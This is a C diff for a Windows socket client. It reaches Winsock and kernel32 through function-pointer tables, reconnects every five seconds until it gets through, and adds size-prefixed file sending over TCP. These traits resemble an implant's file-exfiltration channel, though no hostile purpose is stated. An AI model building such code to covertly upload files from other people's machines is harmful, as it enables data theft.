@@ -25,40 +25,37 @@ void cleanup_wsa(winsock_functions_t* ws_funcs)
 	ws_funcs->WSACleanup();
 }
 
-int init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
+SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
 {
-	SOCKET client_socket;
+	SOCKET server_socket = INVALID_SOCKET;
 	struct sockaddr_in server_addr = { 0 };
 
-	int result = 1;
 
 	while(1)
 	{
-		client_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
-		if (client_socket == INVALID_SOCKET)
+		server_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
+		if (server_socket == INVALID_SOCKET)
 		{
-			return -1;
+			return INVALID_SOCKET;
 		}
 
 		server_addr.sin_family = AF_INET;
 		server_addr.sin_port = ws_funcs->Htons(port);
 		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
 		{
-			return -1;
+			return INVALID_SOCKET;
 		}
 
-		result = ws_funcs->Connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
-
-		if (result == SOCKET_ERROR)
+		if (ws_funcs->Connect(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
 		{
-			ws_funcs->CloseSocket(client_socket);
+			ws_funcs->CloseSocket(server_socket);
 			core_funcs->Sleep(5000);
 			continue;
 		}
 		break;
 	}
 
-	return 0;
+	return server_socket;
 
 }
 
@@ -257,6 +254,36 @@ int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
 	return result;
 }
 
+int send_data_over_socket(SOCKET socket, const char* buf, SIZE_T size, winsock_functions_t* ws, kernel32_functions_t* kernel32)
+{
+	int result = 0;
+	while (1)
+	{
+		result = ws->Send(socket, buf, size, 0);
+		if (result == SOCKET_ERROR)
+		{
+			int error = ws->WSAGetLastError();
+
+			if (error == WSAEWOULDBLOCK)
+			{
+				kernel32->Sleep(10);
+				continue;
+			}
+
+			return -1;
+		}
+		else if (result == 0)
+		{
+			return -1;
+		}
+		break;
+
+	}
+	
+	return 0;
+
+}
+
 int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32)
 {
 	if (ws == NULL || kernel32 == NULL)
@@ -295,6 +322,14 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 		return -1;
 	}
 	file_size.QuadPart = file_size_low;
+	UINT64 size_be = my_byteswap_uint64(file_size.QuadPart);
+
+	if (send_data_over_socket(socket, (const char*)&size_be, sizeof(UINT64), ws, kernel32) != 0)
+	{
+		kernel32->CloseHandle(hFile);
+		return -1;
+	}
+
 
 	buffer = (BYTE*)my_malloc(BUFFER_SIZE);
 	if (buffer == NULL)
@@ -302,10 +337,6 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 		kernel32->CloseHandle(hFile);
 		return -1;
 	}
-
-	// set socket nonblocking
-	//u_long mode = 1;
-	//BOOL socket_was_blocking = ws->ioctlsocket(socket, FIONBIO, &mode) == SOCKET_ERROR ? FALSE : TRUE;
 
 	// set 30s timeout
 	//int send_timeout = 30000;
@@ -324,6 +355,7 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 			DWORD error = kernel32->GetLastError();
 			if (error != ERROR_SUCCESS && error != ERROR_HANDLE_EOF)
 			{
+				result = -1;
 				break;
 			}
 
@@ -336,27 +368,6 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 
 		while (bytes_to_send > 0)
 		{
-			//fd_set write_set;
-			//FD_ZERO(&write_set);
-			//FD_SET(socket, &write_set);
-
-			//struct timeval timeout;
-			//timeout.tv_sec = 30;
-			//timeout.tv_usec = 0;
-
-			//int select_result = ws->select(0, NULL, &write_set, NULL, &timeout);
-
-			//if (select_result == SOCKET_ERROR)
-			//{
-			//	result = -1;
-			//	goto cleanup;
-
-			//}
-			//else if (select_result == 0)
-			//{
-			//	result = -1;
-			//	goto cleanup;
-			//}
 
 			send_result = ws->Send(socket, (const char*)(buffer + bytes_sent), bytes_to_send, 0);
 			if (send_result == SOCKET_ERROR)
